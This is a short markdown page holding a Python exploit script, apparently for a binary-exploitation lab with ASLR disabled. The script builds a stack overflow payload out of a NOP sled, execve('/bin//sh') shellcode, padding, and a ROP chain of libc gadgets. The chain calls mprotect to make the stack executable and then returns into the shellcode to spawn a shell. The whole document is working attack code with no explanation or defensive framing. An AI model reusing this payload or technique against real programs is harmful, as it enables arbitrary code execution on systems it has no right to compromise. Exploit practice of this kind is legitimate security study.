# mprotect

```python
#!/usr/bin/env python3
import sys


def p64(x: int): return x.to_bytes(8, 'little')


# ROP (Return Oriented Programming)
# ASLR disable
# NX: NX enabled
# PIE: No PIE (0x400000)
# Ensure that '\x0a' is excluded when using gets.
shellcode = bytes([
 0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
 0x73, 0x68, 0x53, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0,
 0x3b, 0x0f, 0x05
])
p = b'\x90'*32            # nops
p += shellcode
p += b'A'*(256-len(p))
p += b'B'*8               # saved RBP

# pwndbg> search -l5 --asm 'pop rdi; ret' libc
p += p64(0x7ffff7eaf75b)  # pop rdi; ret;

# pwndbg> vmmap stack
p += p64(0x7ffffffde000)  # arg1: base addr of stack

# pwndbg> search -l5 --asm 'pop rsi; ret' libc
p += p64(0x7ffff7eb0b7c)  # pop rsi; ret;

p += p64(0x01010101)      # arg2: len

# pwndbg> rop --grep 'pop rdx' -- --nojop
p += p64(0x7ffff7e4b8a1)  # pop rdx ; or byte ptr [rcx - 0xa], al ; ret

p += p64(0x7)             # arg3: RWX

# pwndbg> p mprotect
p += p64(0x7ffff7feadb0)  # int mprotect(void addr, size_t len, int prot);

# p += p64(0x7fffffffdd96)  # Stack address differs inside and outside gdb.
p += p64(0x7fffffffde98)  # Check stack address from core dump.

sys.stdout.buffer.write(p)
```
